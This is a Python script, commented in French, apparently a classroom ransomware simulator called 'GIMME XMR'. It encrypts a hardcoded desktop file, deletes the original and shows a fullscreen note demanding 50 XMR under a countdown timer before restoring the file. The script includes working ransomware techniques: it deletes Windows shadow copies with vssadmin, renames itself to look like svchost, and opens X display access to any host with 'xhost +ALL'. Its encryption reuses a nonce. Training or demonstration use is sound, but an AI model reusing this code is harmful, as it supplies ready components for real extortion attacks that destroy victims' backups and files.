# -*- coding: utf-8 -*-
import os, sys, random, time, subprocess, ctypes, threading, shutil
from pathlib import Path
from datetime import datetime
import base64

# --- LOGGING POUR LE DÉBOGAGE (S'écrit dans /tmp/ransom.log sur Linux) ---
LOG_FILE = "/tmp/ransom.log" if os.name != 'nt' else "C:/Users/Public/ransom.log"
def log(msg):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{datetime.now()}] {msg}\n")
    except: pass

log("--- Lancement du Payload Unique ---")

# --- DEPENDENCIES CHECK ---
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    import psutil
    import tkinter as tk
    from tkinter import messagebox
    log("Dépendances chargées avec succès")
except ImportError as e:
    log(f"ERREUR DÉPENDANCES : {e}")

# =============================================================================
# CONFIGURATION
# =============================================================================
TEACHER_PASSWORD = "bob"

# =============================================================================
# MODULE 1 : EVASION & PRIVILEGES
# =============================================================================
def is_admin():
    try:
        if os.name == 'nt': return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else: return os.getuid() == 0
    except: return False

def delete_shadow_copies():
    if os.name == 'nt' and is_admin():
        try:
            subprocess.run(['vssadmin.exe', 'delete', 'shadows', '/all', '/quiet'], 
                           shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            log("Shadow copies supprimées")
        except: pass

def evade_detection():
    try:
        os.rename(sys.argv[0], f"svchost{random.randint(1000,9999)}.py")
        log("Processus renommé en svchost")
    except: pass

def clear_screen():
    subprocess.run(['cls' if os.name == 'nt' else 'clear'], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# =============================================================================
# MODULE 2 : CRYPTO (AES-GCM INTERMITTENT)
# =============================================================================
def derive_key(password: str) -> bytes:
    salt = b'\x00' * 16 
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=600000)
    return kdf.derive(password.encode())

def encrypt_intermittent(data: bytes, key: bytes) -> bytes:
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    if len(data) < 8192:
        return nonce + aesgcm.encrypt(nonce, data, None)
    head = aesgcm.encrypt(nonce, data[:4096], None)
    tail = aesgcm.encrypt(nonce, data[-4096:], None)
    return nonce + head + data[4096:-4096] + tail

# =============================================================================
# MODULE 3 : FILE SYSTEM (CIBLE FIXE & ANTI-CRASH)
# =============================================================================
def get_hardcoded_target():
    """CIBLE FIXE : Gère Desktop et Bureau pour éviter les erreurs de langue"""
    if os.name == 'nt':
        return Path("C:/Users/Candidat/Bureau/text.txt")
    else:
        # Test des deux chemins possibles sur Linux (Anglais vs Français)
        path_en = Path("/home/Candidat/Desktop/text.txt")
        path_fr = Path("/home/Candidat/Bureau/text.txt")
        if path_en.exists(): return path_en
        if path_fr.exists(): return path_fr
        return path_en # Retourne par défaut si rien n'est trouvé

def create_backup(file_path):
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_dir = file_path.parent / f".syscache_{timestamp}"
        backup_dir.mkdir(exist_ok=True)
        backup_path = backup_dir / file_path.name
        shutil.copy2(file_path, backup_path)
        return backup_dir, {str(file_path): str(backup_path)}
    except Exception as e:
        log(f"Erreur backup : {e}")
        return None, {}

# =============================================================================
# MODULE 4 : UI GIMME XMR (DESIGN ORIGINAL + ANTI-VOID)
# =============================================================================
def launch_ransom_gui():
    try:
        if os.name != 'nt':
            # FORCE L'AFFICHAGE SUR L'ÉCRAN PHYSIQUE (Anti-Void)
            os.environ['DISPLAY'] = ':0'
            os.environ['XAUTHORITY'] = '/home/Candidat/.Xauthority'
            # On autorise l'accès X via l'utilisateur Candidat
            subprocess.run(['sudo', '-u', 'Candidat', 'xhost', '+ALL'], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        root = tk.Tk()
        root.title("GIMME XMR - Simulation")
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True) 
        root.configure(bg="#0f0f0f")

        seconds_left = 10800 
        def update_timer():
            nonlocal seconds_left
            if seconds_left > 0:
                seconds_left -= 1
                h, m, s = seconds_left // 3600, (seconds_left % 3600)//60, seconds_left % 60
                timer_label.config(text=f"TEMPS RESTANT : {h:02d}:{m:02d}:{s:02d}")
                root.after(1000, update_timer)
            else:
                timer_label.config(text="TEMPS ECOULE - DONNEES SUPPRIMEES", fg="red")

        ascii_banner = r"""
           ██████╗ ██╗███╗   ███╗███╗   ███╗███████╗
          ██╔════╝ ██║████╗ ████║████╗ ████║██╔════╝
          ██║  ███╗██║██╔████╔██║██╔████╔██║█████╗  
          ██║   ██║██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  
          ╚██████╔╝██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗
           ╚═════╝ ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝

                   ╔══════════════════════╗
                   ║     GIMME - XMR      ║
                   ╚══════════════════════╝"""
        
        banner_label = tk.Label(root, text=ascii_banner, font=("Consolas", 10), fg="#00ff88", bg="#0f0f0f", justify="left")
        banner_label.pack(pady=40)

        title_label = tk.Label(root, text="⚠️ Données Cryptées - Aucune Erreur Détectée ⚠️", font=("Arial", 18, "bold"), fg="#ff3b3b", bg="#0f0f0f")
        title_label.pack(pady=10)

        desc_text = "Vos fichiers sont cryptés !\n\nBonjour, votre ordinateur a été infecté. Tous vos fichiers sont verrouillés.\n\n" \
                    "Je vous invite à coopérer afin de récupérer vos données. Vous avez 3 heures pour verser 50 XMR.\n\n" \
                    "Attention, arrêter puis redémarrer le PC est inutile."
        
        desc_label = tk.Label(root, text=desc_text, font=("Arial", 12), fg="white", bg="#0f0f0f", justify="center")
        desc_label.pack(pady=20)

        timer_label = tk.Label(root, text="TEMPS RESTANT : 03:00:00", font=("Arial", 24, "bold"), fg="white", bg="#0f0f0f")
        timer_label.pack(pady=20)
        
        btn = tk.Button(root, text="Simuler le paiement", command=lambda: messagebox.showinfo("Info", "Paiement simulé avec succès !"), 
                      font=("Arial", 12, "bold"), bg="#ff2e2e", fg="white", padx=20, pady=10)
        btn.pack(pady=30)

        footer = tk.Label(root, text="Educational cybersecurity simulation only", font=("Arial", 10, "italic"), fg="#888888", bg="#0f0f0f")
        footer.pack(side="bottom", pady=10)

        update_timer()
        root.mainloop()
    except Exception as e:
        log(f"ERREUR GUI : {e}")

# =============================================================================
# MAIN SIMULATOR
# =============================================================================
class RansomwareSimulator:
    def __init__(self):
        self.all_backups = []
        self.key = derive_key(TEACHER_PASSWORD)

    def process_file(self, file_path):
        try:
            with open(file_path, 'rb') as f: data = f.read()
            enc = encrypt_intermittent(data, self.key)
            new_name = file_path.with_suffix(file_path.suffix + '.encrypted')
            with open(new_name, 'wb') as f: f.write(enc)
            file_path.unlink()
            log(f"Fichier chiffré : {file_path.name}")
        except Exception as e:
            log(f"Erreur chiffrement {file_path}: {e}")

    def run(self):
        log("Début de la phase run()")
        if is_admin(): 
            delete_shadow_copies()
            log("Shadow copies traitées")
        
        evade_detection()
        
        # --- CIBLE FIXE (SÉCURISÉ) ---
        target_file = get_hardcoded_target()
        log(f"Recherche de la cible : {target_file}")
        
        try:
            if target_file.exists():
                b_dir, b_map = create_backup(target_file)
                if b_dir: 
                    self.all_backups.append((b_dir, b_map))
                    log(f"Backup créé : {b_dir}")
                
                self.process_file(target_file)
            else:
                log(f"CIBLE INTROUVABLE : {target_file} n'existe pas")
        except Exception as e:
            log(f"Erreur lors du traitement de la cible : {e}")
        
        clear_screen()
        log("Lancement de l'UI...")
        launch_ransom_gui()
        
        log("Fermeture UI, restauration des fichiers...")
        for b_dir, b_map in self.all_backups:
            for orig, bkp in b_map.items():
                try: shutil.copy2(bkp, orig)
                except: pass
            if b_dir: shutil.rmtree(b_dir)
        log("Fin de la simulation.")

if __name__ == "__main__":
    try:
        RansomwareSimulator().run()
    except Exception as e:
        log(f"CRASH FATAL : {e}")
